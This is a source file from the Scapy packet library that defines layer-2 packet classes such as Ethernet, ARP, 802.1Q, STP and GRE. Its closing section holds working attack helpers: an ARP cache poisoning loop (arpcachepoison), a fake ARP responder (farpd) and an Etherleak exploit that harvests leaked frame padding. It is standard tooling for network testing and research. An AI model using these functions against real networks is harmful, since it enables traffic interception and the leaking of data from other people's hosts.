# This file is part of Scapy
## See http://www.secdev.org/projects/scapy for more informations
## Copyright (C) Philippe Biondi <phil@secdev.org>
## This program is published under a GPLv2 license

"""
Classes and functions for layer 2 protocols.
"""

from __future__ import absolute_import
from __future__ import print_function
import os, struct, time, socket

import scapy
from scapy.base_classes import Net
from scapy.config import conf
from scapy.data import *
from scapy.compat import *
from scapy.packet import *
from scapy.ansmachine import *
from scapy.plist import SndRcvList
from scapy.fields import *
from scapy.sendrecv import srp, srp1, srpflood
from scapy.arch import get_if_hwaddr
from scapy.utils import inet_ntoa, inet_aton
from scapy.error import warning
if conf.route is None:
    # unused import, only to initialize conf.route
    import scapy.route




#################
## Tools       ##
#################


class Neighbor:
    def __init__(self):
        self.resolvers = {}

    def register_l3(self, l2, l3, resolve_method):
        self.resolvers[l2,l3]=resolve_method

    def resolve(self, l2inst, l3inst):
        k = l2inst.__class__,l3inst.__class__
        if k in self.resolvers:
            return self.resolvers[k](l2inst,l3inst)

    def __repr__(self):
        return "\n".join("%-15s -> %-15s" % (l2.__name__, l3.__name__) for l2,l3 in self.resolvers)

conf.neighbor = Neighbor()

conf.netcache.new_cache("arp_cache", 120) # cache entries expire after 120s


@conf.commands.register
def getmacbyip(ip, chainCC=0):
    """Return MAC address corresponding to a given IP address"""
    if isinstance(ip, Net):
        ip = next(iter(ip))
    ip = inet_ntoa(inet_aton(ip))
    tmp = [orb(e) for e in inet_aton(ip)]
    if (tmp[0] & 0xf0) == 0xe0: # mcast @
        return "01:00:5e:%.2x:%.2x:%.2x" % (tmp[1]&0x7f,tmp[2],tmp[3])
    iff,a,gw = conf.route.route(ip)
    if ( (iff == scapy.consts.LOOPBACK_INTERFACE) or (ip == conf.route.get_if_bcast(iff)) ):
        return "ff:ff:ff:ff:ff:ff"
    if gw != "0.0.0.0":
        ip = gw

    mac = conf.netcache.arp_cache.get(ip)
    if mac:
        return mac

    res = srp1(Ether(dst=ETHER_BROADCAST)/ARP(op="who-has", pdst=ip),
               type=ETH_P_ARP,
               iface = iff,
               timeout=2,
               verbose=0,
               chainCC=chainCC,
               nofilter=1)
    if res is not None:
        mac = res.payload.hwsrc
        conf.netcache.arp_cache[ip] = mac
        return mac
    return None



### Fields

class DestMACField(MACField):
    def __init__(self, name):
        MACField.__init__(self, name, None)
    def i2h(self, pkt, x):
        if x is None:
            try:
                x = conf.neighbor.resolve(pkt,pkt.payload)
            except socket.error:
                pass
            if x is None:
                x = "ff:ff:ff:ff:ff:ff"
                warning("Mac address to reach destination not found. Using broadcast.")
        return MACField.i2h(self, pkt, x)
    def i2m(self, pkt, x):
        return MACField.i2m(self, pkt, self.i2h(pkt, x))


class SourceMACField(MACField):
    __slots__ = ["getif"]
    def __init__(self, name, getif=None):
        MACField.__init__(self, name, None)
        self.getif = ((lambda pkt: pkt.payload.route()[0])
                      if getif is None else getif)
    def i2h(self, pkt, x):
        if x is None:
            iff = self.getif(pkt)
            if iff is None:
                iff = conf.iface
            if iff:
                try:
                    x = get_if_hwaddr(iff)
                except:
                    pass
            if x is None:
                x = "00:00:00:00:00:00"
        return MACField.i2h(self, pkt, x)
    def i2m(self, pkt, x):
        return MACField.i2m(self, pkt, self.i2h(pkt, x))


class ARPSourceMACField(SourceMACField):
    def __init__(self, name):
        super(ARPSourceMACField, self).__init__(
            name,
            getif=lambda pkt: pkt.route()[0],
        )


### Layers

ETHER_TYPES['802_AD'] = 0x88a8
ETHER_TYPES['802_1AE'] = ETH_P_MACSEC

class Ether(Packet):
    name = "Ethernet"
    fields_desc = [ DestMACField("dst"),
                    SourceMACField("src"),
                    XShortEnumField("type", 0x9000, ETHER_TYPES) ]
    __slots__ = ["_defrag_pos"]
    def hashret(self):
        return struct.pack("H",self.type)+self.payload.hashret()
    def answers(self, other):
        if isinstance(other,Ether):
            if self.type == other.type:
                return self.payload.answers(other.payload)
        return 0
    def mysummary(self):
        return self.sprintf("%src% > %dst% (%type%)")
    @classmethod
    def dispatch_hook(cls, _pkt=None, *args, **kargs):
        if _pkt and len(_pkt) >= 14:
            if struct.unpack("!H", _pkt[12:14])[0] <= 1500:
                return Dot3
        return cls


class Dot3(Packet):
    name = "802.3"
    fields_desc = [ DestMACField("dst"),
                    MACField("src", ETHER_ANY),
                    LenField("len", None, "H") ]
    def extract_padding(self,s):
        l = self.len
        return s[:l],s[l:]
    def answers(self, other):
        if isinstance(other,Dot3):
            return self.payload.answers(other.payload)
        return 0
    def mysummary(self):
        return "802.3 %s > %s" % (self.src, self.dst)
    @classmethod
    def dispatch_hook(cls, _pkt=None, *args, **kargs):
        if _pkt and len(_pkt) >= 14:
            if struct.unpack("!H", _pkt[12:14])[0] > 1500:
                return Ether
        return cls


class LLC(Packet):
    name = "LLC"
    fields_desc = [ XByteField("dsap", 0x00),
                    XByteField("ssap", 0x00),
                    ByteField("ctrl", 0) ]

def l2_register_l3(l2, l3):
    return conf.neighbor.resolve(l2, l3.payload)
conf.neighbor.register_l3(Ether, LLC, l2_register_l3)
conf.neighbor.register_l3(Dot3, LLC, l2_register_l3)


class CookedLinux(Packet):
    # Documentation: http://www.tcpdump.org/linktypes/LINKTYPE_LINUX_SLL.html
    name = "cooked linux"
    # from wireshark's database
    fields_desc = [ ShortEnumField("pkttype",0, {0: "unicast",
                                                 1: "broadcast",
                                                 2: "multicast",
                                                 3: "unicast-to-another-host",
                                                 4:"sent-by-us"}),
                    XShortField("lladdrtype",512),
                    ShortField("lladdrlen",0),
                    StrFixedLenField("src","",8),
                    XShortEnumField("proto",0x800,ETHER_TYPES) ]
                    
                                   

class SNAP(Packet):
    name = "SNAP"
    fields_desc = [ X3BytesField("OUI",0x000000),
                    XShortEnumField("code", 0x000, ETHER_TYPES) ]

conf.neighbor.register_l3(Dot3, SNAP, l2_register_l3)


class Dot1Q(Packet):
    name = "802.1Q"
    aliastypes = [ Ether ]
    fields_desc =  [ BitField("prio", 0, 3),
                     BitField("id", 0, 1),
                     BitField("vlan", 1, 12),
                     XShortEnumField("type", 0x0000, ETHER_TYPES) ]
    def answers(self, other):
        if isinstance(other,Dot1Q):
            if ( (self.type == other.type) and
                 (self.vlan == other.vlan) ):
                return self.payload.answers(other.payload)
        else:
            return self.payload.answers(other)
        return 0
    def default_payload_class(self, pay):
        if self.type <= 1500:
            return LLC
        return conf.raw_layer
    def extract_padding(self,s):
        if self.type <= 1500:
            return s[:self.type],s[self.type:]
        return s,None
    def mysummary(self):
        if isinstance(self.underlayer, Ether):
            return self.underlayer.sprintf("802.1q %Ether.src% > %Ether.dst% (%Dot1Q.type%) vlan %Dot1Q.vlan%")
        else:
            return self.sprintf("802.1q (%Dot1Q.type%) vlan %Dot1Q.vlan%")

            
conf.neighbor.register_l3(Ether, Dot1Q, l2_register_l3)

class STP(Packet):
    name = "Spanning Tree Protocol"
    fields_desc = [ ShortField("proto", 0),
                    ByteField("version", 0),
                    ByteField("bpdutype", 0),
                    ByteField("bpduflags", 0),
                    ShortField("rootid", 0),
                    MACField("rootmac", ETHER_ANY),
                    IntField("pathcost", 0),
                    ShortField("bridgeid", 0),
                    MACField("bridgemac", ETHER_ANY),
                    ShortField("portid", 0),
                    BCDFloatField("age", 1),
                    BCDFloatField("maxage", 20),
                    BCDFloatField("hellotime", 2),
                    BCDFloatField("fwddelay", 15) ]


class ARP(Packet):
    name = "ARP"
    fields_desc = [ XShortField("hwtype", 0x0001),
                    XShortEnumField("ptype",  0x0800, ETHER_TYPES),
                    ByteField("hwlen", 6),
                    ByteField("plen", 4),
                    ShortEnumField("op", 1, {"who-has":1, "is-at":2, "RARP-req":3, "RARP-rep":4, "Dyn-RARP-req":5, "Dyn-RAR-rep":6, "Dyn-RARP-err":7, "InARP-req":8, "InARP-rep":9}),
                    ARPSourceMACField("hwsrc"),
                    SourceIPField("psrc","pdst"),
                    MACField("hwdst", ETHER_ANY),
                    IPField("pdst", "0.0.0.0") ]
    who_has = 1
    is_at = 2
    def answers(self, other):
        if isinstance(other,ARP):
            if ( (self.op == self.is_at) and
                 (other.op == self.who_has) and
                 (self.psrc == other.pdst) ):
                return 1
        return 0
    def route(self):
        dst = self.pdst
        if isinstance(dst,Gen):
            dst = next(iter(dst))
        return conf.route.route(dst)
    def extract_padding(self, s):
        return "",s
    def mysummary(self):
        if self.op == self.is_at:
            return self.sprintf("ARP is at %hwsrc% says %psrc%")
        elif self.op == self.who_has:
            return self.sprintf("ARP who has %pdst% says %psrc%")
        else:
            return self.sprintf("ARP %op% %psrc% > %pdst%")
                 
def l2_register_l3_arp(l2, l3):
    return getmacbyip(l3.pdst)
conf.neighbor.register_l3(Ether, ARP, l2_register_l3_arp)

class GRErouting(Packet):
    name = "GRE routing informations"
    fields_desc = [ ShortField("address_family",0),
                    ByteField("SRE_offset", 0),
                    FieldLenField("SRE_len", None, "routing_info", "B"),
                    StrLenField("routing_info", "", "SRE_len"),
                    ]


class GRE(Packet):
    name = "GRE"
    fields_desc = [ BitField("chksum_present",0,1),
                    BitField("routing_present",0,1),
                    BitField("key_present",0,1),
                    BitField("seqnum_present",0,1),
                    BitField("strict_route_source",0,1),
                    BitField("recursion_control",0,3),
                    BitField("flags",0,5),
                    BitField("version",0,3),
                    XShortEnumField("proto", 0x0000, ETHER_TYPES),
                    ConditionalField(XShortField("chksum",None), lambda pkt:pkt.chksum_present==1 or pkt.routing_present==1),
                    ConditionalField(XShortField("offset",None), lambda pkt:pkt.chksum_present==1 or pkt.routing_present==1),
                    ConditionalField(XIntField("key",None), lambda pkt:pkt.key_present==1),
                    ConditionalField(XIntField("seqence_number",None), lambda pkt:pkt.seqnum_present==1),
                    ]

    @classmethod
    def dispatch_hook(cls, _pkt=None, *args, **kargs):
        if _pkt and struct.unpack("!H", _pkt[2:4])[0] == 0x880b:
            return GRE_PPTP
        return cls

    def post_build(self, p, pay):
        p += pay
        if self.chksum_present and self.chksum is None:
            c = checksum(p)
            p = p[:4]+chb((c>>8)&0xff)+chb(c&0xff)+p[6:]
        return p


class GRE_PPTP(GRE):

    """
    Enhanced GRE header used with PPTP
    RFC 2637
    """

    name = "GRE PPTP"
    fields_desc = [BitField("chksum_present", 0, 1),
                   BitField("routing_present", 0, 1),
                   BitField("key_present", 1, 1),
                   BitField("seqnum_present", 0, 1),
                   BitField("strict_route_source", 0, 1),
                   BitField("recursion_control", 0, 3),
                   BitField("acknum_present", 0, 1),
                   BitField("flags", 0, 4),
                   BitField("version", 1, 3),
                   XShortEnumField("proto", 0x880b, ETHER_TYPES),
                   ShortField("payload_len", None),
                   ShortField("call_id", None),
                   ConditionalField(XIntField("seqence_number", None), lambda pkt: pkt.seqnum_present == 1),
                   ConditionalField(XIntField("ack_number", None), lambda pkt: pkt.acknum_present == 1)]

    def post_build(self, p, pay):
        p += pay
        if self.payload_len is None:
            pay_len = len(pay)
            p = p[:4] + chb((pay_len >> 8) & 0xff) + chb(pay_len & 0xff) + p[6:]
        return p


### *BSD loopback layer

class LoIntEnumField(EnumField):
    def __init__(self, name, default, enum):
        EnumField.__init__(self, name, default, enum, "!I")

    def m2i(self, pkt, x):
        return x >> 24

    def i2m(self, pkt, x):
        return x << 24

# https://github.com/wireshark/wireshark/blob/fe219637a6748130266a0b0278166046e60a2d68/epan/dissectors/packet-null.c
# https://www.wireshark.org/docs/wsar_html/epan/aftypes_8h.html
LOOPBACK_TYPES = { 0x2: "IPv4",
                   0x7: "OSI",
                   0x10: "Appletalk",
                   0x17: "Netware IPX/SPX",
                   0x18: "IPv6", 0x1c: "IPv6", 0x1e: "IPv6" }

class Loopback(Packet):
    """*BSD loopback layer"""

    name = "Loopback"
    fields_desc = [ LoIntEnumField("type", 0x2, LOOPBACK_TYPES) ]
    __slots__ = ["_defrag_pos"]


class Dot1AD(Dot1Q):
    name = '802_1AD'


bind_layers( Dot3,          LLC,           )
bind_layers( Ether,         LLC,           type=122)
bind_layers( Ether,         LLC,           type=34928)
bind_layers( Ether,         Dot1Q,         type=33024)
bind_layers( Ether,         Dot1AD,        type=0x88a8)
bind_layers( Dot1AD,        Dot1AD,        type=0x88a8)
bind_layers( Dot1AD,        Dot1Q,         type=0x8100)
bind_layers( Dot1Q,         Dot1AD,        type=0x88a8)
bind_layers( Ether,         Ether,         type=1)
bind_layers( Ether,         ARP,           type=2054)
bind_layers( CookedLinux,   LLC,           proto=122)
bind_layers( CookedLinux,   Dot1Q,         proto=33024)
bind_layers( CookedLinux,   Dot1AD,        type=0x88a8)
bind_layers( CookedLinux,   Ether,         proto=1)
bind_layers( CookedLinux,   ARP,           proto=2054)
bind_layers( GRE,           LLC,           proto=122)
bind_layers( GRE,           Dot1Q,         proto=33024)
bind_layers( GRE,           Dot1AD,        type=0x88a8)
bind_layers( GRE,           Ether,         proto=0x6558)
bind_layers( GRE,           ARP,           proto=2054)
bind_layers( GRE,           GRErouting,    { "routing_present" : 1 } )
bind_layers( GRErouting,    conf.raw_layer,{ "address_family" : 0, "SRE_len" : 0 })
bind_layers( GRErouting,    GRErouting,    { } )
bind_layers( LLC,           STP,           dsap=66, ssap=66, ctrl=3)
bind_layers( LLC,           SNAP,          dsap=170, ssap=170, ctrl=3)
bind_layers( SNAP,          Dot1Q,         code=33024)
bind_layers( SNAP,          Dot1AD,        type=0x88a8)
bind_layers( SNAP,          Ether,         code=1)
bind_layers( SNAP,          ARP,           code=2054)
bind_layers( SNAP,          STP,           code=267)

conf.l2types.register(ARPHDR_ETHER, Ether)
conf.l2types.register_num2layer(ARPHDR_METRICOM, Ether)
conf.l2types.register_num2layer(ARPHDR_LOOPBACK, Ether)
conf.l2types.register_layer2num(ARPHDR_ETHER, Dot3)
conf.l2types.register(DLT_LINUX_SLL, CookedLinux)
conf.l2types.register_num2layer(DLT_LINUX_IRDA, CookedLinux)
conf.l2types.register(DLT_LOOP, Loopback)
conf.l2types.register_num2layer(DLT_NULL, Loopback)

conf.l3types.register(ETH_P_ARP, ARP)




### Technics



@conf.commands.register
def arpcachepoison(target, victim, interval=60):
    """Poison target's cache with (your MAC,victim's IP) couple
arpcachepoison(target, victim, [interval=60]) -> None
"""
    tmac = getmacbyip(target)
    p = Ether(dst=tmac)/ARP(op="who-has", psrc=victim, pdst=target)
    try:
        while True:
            sendp(p, iface_hint=target)
            if conf.verb > 1:
                os.write(1, b".")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass


class ARPingResult(SndRcvList):
    def __init__(self, res=None, name="ARPing", stats=None):
        SndRcvList.__init__(self, res, name, stats)

    def show(self):
        for s,r in self.res:
            print(r.sprintf("%19s,Ether.src% %ARP.psrc%"))



@conf.commands.register
def arping(net, timeout=2, cache=0, verbose=None, **kargs):
    """Send ARP who-has requests to determine which hosts are up
arping(net, [cache=0,] [iface=conf.iface,] [verbose=conf.verb]) -> None
Set cache=True if you want arping to modify internal ARP-Cache"""
    if verbose is None:
        verbose = conf.verb
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net), verbose=verbose,
                    filter="arp and arp[7] = 2", timeout=timeout, iface_hint=net, **kargs)
    ans = ARPingResult(ans.res)

    if cache and ans is not None:
        for pair in ans:
            conf.netcache.arp_cache[pair[1].psrc] = (pair[1].hwsrc, time.time())
    if verbose:
        ans.show()
    return ans,unans

@conf.commands.register
def is_promisc(ip, fake_bcast="ff:ff:00:00:00:00",**kargs):
    """Try to guess if target is in Promisc mode. The target is provided by its ip."""

    responses = srp1(Ether(dst=fake_bcast) / ARP(op="who-has", pdst=ip),type=ETH_P_ARP, iface_hint=ip, timeout=1, verbose=0,**kargs)

    return responses is not None

@conf.commands.register
def promiscping(net, timeout=2, fake_bcast="ff:ff:ff:ff:ff:fe", **kargs):
    """Send ARP who-has requests to determine which hosts are in promiscuous mode
    promiscping(net, iface=conf.iface)"""
    ans,unans = srp(Ether(dst=fake_bcast)/ARP(pdst=net),
                    filter="arp and arp[7] = 2", timeout=timeout, iface_hint=net, **kargs)
    ans = ARPingResult(ans.res, name="PROMISCPing")

    ans.display()
    return ans,unans


class ARP_am(AnsweringMachine):
    """Fake ARP Relay Daemon (farpd)

    example:
    To respond to an ARP request for 192.168.100 replying on the
    ingress interface;
      farpd(IP_addr='192.168.1.100',ARP_addr='00:01:02:03:04:05')
    To respond on a different interface add the interface parameter
      farpd(IP_addr='192.168.1.100',ARP_addr='00:01:02:03:04:05',iface='eth0')
    To respond on ANY arp request on an interface with mac address ARP_addr
      farpd(ARP_addr='00:01:02:03:04:05',iface='eth1')
    To respond on ANY arp request with my mac addr on the given interface
      farpd(iface='eth1')

    Optional Args
     inter=<n>   Interval in seconds between ARP replies being sent
    
    """

    function_name="farpd"
    filter = "arp"
    send_function = staticmethod(sendp)

    def parse_options(self, IP_addr=None, ARP_addr=None):
        self.IP_addr=IP_addr
        self.ARP_addr=ARP_addr

    def is_request(self, req):
        return (req.haslayer(ARP) and
                req.getlayer(ARP).op == 1 and
                (self.IP_addr == None or self.IP_addr == req.getlayer(ARP).pdst))
    
    def make_reply(self, req):
        ether = req.getlayer(Ether)
        arp = req.getlayer(ARP)

        if 'iface' in self.optsend:
            iff = self.optsend.get('iface')
        else:
            iff,a,gw = conf.route.route(arp.psrc)
        self.iff = iff
        if self.ARP_addr is None:
            try:
                ARP_addr = get_if_hwaddr(iff)
            except:
                ARP_addr = "00:00:00:00:00:00"
                pass
        else:
            ARP_addr = self.ARP_addr
        resp = Ether(dst=ether.src,
                     src=ARP_addr)/ARP(op="is-at",
                                       hwsrc=ARP_addr,
                                       psrc=arp.pdst,
                                       hwdst=arp.hwsrc,
                                       pdst=arp.psrc)
        return resp

    def send_reply(self, reply):
        if 'iface' in self.optsend:
            self.send_function(reply, **self.optsend)
        else:
            self.send_function(reply, iface=self.iff, **self.optsend)

    def print_reply(self, req, reply):
        print("%s ==> %s on %s" % (req.summary(),reply.summary(),self.iff))


@conf.commands.register
def etherleak(target, **kargs):
    """Exploit Etherleak flaw"""
    return srpflood(Ether()/ARP(pdst=target), 
                    prn=lambda s_r: conf.padding_layer in s_r[1] and hexstr(s_r[1][conf.padding_layer].load),
                    filter="arp", **kargs)


